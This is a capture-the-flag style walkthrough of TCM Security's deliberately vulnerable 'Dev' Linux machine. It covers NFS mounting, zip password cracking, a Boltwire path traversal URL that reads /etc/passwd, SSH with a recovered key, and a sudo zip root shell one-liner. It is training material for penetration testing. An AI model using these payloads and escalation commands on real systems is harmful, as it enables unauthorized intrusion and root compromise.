<div align="center">

![FuzzRaiders Member Card](../../../../../Assets/fuzzraiders-dev.svg)

</div>

---

## 📌 Overview

Dev is a deliberately vulnerable Linux machine from TCM Security's Practical Ethical Hacking course. It teaches a multi-service attack chain combining NFS enumeration, web application credential exposure, file inclusion vulnerability for user discovery, and sudo binary abuse for privilege escalation.

The attack chain requires:

- NFS share enumeration and mounting to retrieve a password-protected archive
- Zip password cracking to extract an SSH private key and a username hint
- Web application directory traversal to identify a valid SSH username
- SSH login using the private key
- Privilege escalation via `sudo zip` (GTFOBins)

---

## 🛠 Tools Used

```
nmap            → port and service discovery
gobuster        → web directory enumeration
showmount       → NFS share enumeration
mount           → mounting remote NFS share
fcrackzip       → zip password cracking
ssh             → remote access
GTFOBins        → sudo zip privilege escalation reference
```

---

## 🎯 Target Information

|Field|Value|
|---|---|
|Target IP|172.20.10.5|
|Attacker IP|172.20.10.2|
|OS|Linux Debian|
|Key Services|SSH (22), HTTP (80/8080), NFS (2049), RPC (111)|
|Goal|Read /root/flag.txt|

---

## 🧭 Walkthrough

### Step 1 — Service Discovery (Nmap)

**Goal:** Identify all open ports and services.

```bash
nmap -p- -A -T4 172.20.10.5
```

**Key findings:**

|Port|Service|Detail|
|---|---|---|
|22/tcp|SSH|OpenSSH 7.9p1 Debian|
|80/tcp|HTTP|Apache 2.4.38 — Bolt CMS installation error|
|111/tcp|RPC|rpcbind 2-4|
|2049/tcp|NFS|NFS share available|
|8080/tcp|HTTP|Apache 2.4.38 — PHP info page|

Three attack surfaces immediately: a web app on port 80, a second web app on port 8080, and an NFS share on port 2049. NFS is always worth investigating first — it can expose files directly.


![Nmap Scan Results](./imges/nmap.png)

---

### Step 2 — Web Enumeration (Gobuster)

**Goal:** Discover directories on both web services.

```bash
gobuster dir -u http://172.20.10.5 \
  -w /usr/share/seclists/SecLists-master/Discovery/Web-Content/big.txt \
  -x php,html,txt

gobuster dir -u http://172.20.10.5:8080 \
  -w /usr/share/seclists/SecLists-master/Discovery/Web-Content/big.txt \
  -x php,html,txt
```

**Port 80 results:** `/app`, `/src`, `/public`, `/vendor`, `/extensions` — Bolt CMS directories

**Port 8080 results:** `/dev` (301 → Boltwire CMS), `/index.php`

The `/app` directory on port 80 was accessible without authentication. Browsing into `/app/config/` revealed `config.yml`.

![Nmap Scan Results](./imges/dirbuster.png)
---

### Step 3 — Credential Exposure in config.yml

**Goal:** Extract credentials from the exposed configuration file.

Navigating to `http://172.20.10.5/app/config/config.yml` exposed the Bolt CMS database configuration in plaintext:

```yaml
database:
  driver: sqlite
  databasename: bolt
  username: bolt
  password: I_love_java
```

Credentials noted: `bolt : I_love_java`

This is a direct information disclosure finding — a configuration file accessible without authentication over HTTP.

![Nmap Scan Results](./imges/found%20database%20creds.png)

---

### Step 4 — NFS Enumeration and Mounting

**Goal:** Access files from the exposed NFS share.

Port 111 (RPC) and 2049 (NFS) indicated a network file share. The export list was queried:

```bash
showmount -e 172.20.10.5
```

**Output:**

```
Export list for 172.20.10.5:
/srv/nfs  172.16.0.0/12,10.0.0.0/8,192.168.0.0/16
```

The share `/srv/nfs` was accessible from common private network ranges. The share was mounted locally:

```bash
sudo mkdir /mnt/nfs
sudo mount -t nfs -o vers=3 172.20.10.5:/srv/nfs /mnt/nfs
cd /mnt/nfs
ls
# save.zip
```

A password-protected zip file was found on the share.

![Nmap Scan Results](./imges/nfs%20shared%20found%20mounted.png)

---

### Step 5 — Zip Password Cracking

**Goal:** Crack the password on save.zip to access its contents.

`unzip save.zip` prompted for a password. `fcrackzip` was used to perform a dictionary attack:

```bash
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
```

**Output:**

```
PASSWORD FOUND!!!!: pw == java101
```

The zip was unlocked with password `java101`.

![Nmap Scan Results](./imges/crack%20a%20zip%20file%20after%20we%20found%20i%20in%20rpcclient%20port%20111.png)

---

### Step 6 — Extracting SSH Key and Username Hint

**Goal:** Recover useful files from the cracked archive.

```bash
unzip save.zip
ls
# id_rsa    save.zip    todo.txt

cat todo.txt
# - Figure out how to install the main website properly...
# - Update development website
# - Keep coding in Java because it's awesome
# jp

cat id_rsa
# -----BEGIN OPENSSH PRIVATE KEY-----
# ...
```

Two files extracted:

- `id_rsa` — SSH private key
- `todo.txt` — note signed by `jp`

A potential username `jp` was identified. However, `jp` alone is insufficient — the full username needed to be confirmed.

![Nmap Scan Results](./imges/rsa%20found.png)

---

### Step 7 — Username Discovery via Boltwire File Inclusion

**Goal:** Find the full system username via the Boltwire vulnerability.

The `/dev` directory on port 8080 hosted Boltwire CMS. Boltwire has a known file inclusion vulnerability that allows reading local files by manipulating the URL parameter:

```
http://172.20.10.5:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd
```

The `/etc/passwd` file was returned in the response. Reviewing the entries revealed:

```
jeanpaul:x:1000:1000:,,,:/home/jeanpaul:/bin/bash
```

The full username was `jeanpaul` — matching the initials `jp` from `todo.txt`.

---

### Step 8 — SSH Access as jeanpaul

**Goal:** Authenticate via SSH using the private key.

```bash
chmod 600 id_rsa
ssh -i id_rsa jeanpaul@172.20.10.5
# Passphrase: I_love_java
```

Login successful as `jeanpaul`.

**Why `I_love_java` as the passphrase?** The password was reused from `config.yml`. The todo.txt also referenced Java directly ("Keep coding in Java because it's awesome") — a strong hint toward password reuse.

---

### Step 9 — Privilege Escalation via sudo zip

**Goal:** Escalate from jeanpaul to root.

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/zip
```

`jeanpaul` could run `zip` as root without a password. GTFOBins documents a privilege escalation path for `sudo zip`:

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

This abuses zip's `-TT` (test-script) option to execute an arbitrary command — in this case spawning a shell — as root.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cd /root
cat flag.txt
```

Root access confirmed. Flag captured.

---

## ✅ Proof of Compromise

|Flag|Location|
|---|---|
|Root flag|`/root/flag.txt`|

Root shell obtained via `sudo zip` GTFOBins abuse.

---

## 🧠 What This Lab Teaches

- **NFS shares are high-value targets** — any accessible share may contain sensitive files
- **Config files left in web-accessible directories expose credentials** — `config.yml` should never be browsable
- **Cross-service credential reuse** — the same password appeared in the database config and as the SSH key passphrase
- **Username hints accumulate** — `jp` from todo.txt + `jeanpaul` from /etc/passwd via file inclusion = the complete answer
- **`sudo -l` is always the first privesc check** — one command reveals what binaries you can run as root
- **GTFOBins is essential** — many seemingly harmless binaries have documented escalation paths

---

## 🚀 Attack Chain Summary

```
Nmap → ports 22, 80, 111, 2049, 8080
    ↓
Gobuster port 80 → /app/config/config.yml → bolt:I_love_java
Gobuster port 8080 → /dev (Boltwire CMS)
    ↓
NFS: showmount → /srv/nfs accessible
    ↓
Mount NFS → save.zip found
    ↓
fcrackzip → password: java101
    ↓
Unzip → id_rsa + todo.txt (signed: jp)
    ↓
Boltwire file inclusion → /etc/passwd → username: jeanpaul
    ↓
ssh -i id_rsa jeanpaul@172.20.10.5 (passphrase: I_love_java)
    ↓
sudo -l → sudo zip allowed
    ↓
GTFOBins zip → sudo zip $TF /etc/hosts -T -TT 'sh #' → root
    ↓
/root/flag.txt
```

---

## 📌 Conclusion

> **Multiple services, multiple clues — none of them complete on their own.**

Dev teaches that real penetration testing rarely follows a single linear path. The NFS share gave you the key and a partial username. The config file gave you a password. The web app gave you the full username. Only by combining all three pieces did SSH access become possible.

---

This work is part of **FuzzRaiders**' structured hands-on training and research program, where every lab, project, and technical study is formally documented, reviewed, and validated to ensure real-world applicability and methodological rigor.

Happy hacking 🚀

---

<div align="center">

![Ownership Notice](../../../../../Assets/fuzzraiders-Ownership.svg)


</div>

